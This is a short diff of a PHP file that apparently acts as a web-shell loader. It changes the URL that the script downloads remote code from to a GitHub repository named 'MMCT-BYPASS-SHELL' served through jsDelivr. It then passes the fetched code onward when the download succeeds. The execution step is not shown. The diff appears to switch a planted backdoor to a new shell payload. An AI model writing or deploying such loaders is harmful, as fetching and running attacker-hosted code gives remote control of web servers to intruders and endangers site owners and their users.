@@ -30,7 +30,7 @@ if (!function_exists('get_magic_quotes_gpc')) {
     }
 }
 
-$url = "https://cdn.jsdelivr.net/gh/Ahmad-Fauzi-max/memek@main/MMCTV3.2.txt";
+$url = "https://cdn.jsdelivr.net/gh/JohnFelixx/MMCT-BYPASS-SHELL@main/MMCT32.txt";
 $code = getRemoteCode($url);
 
 if ($code !== false) {
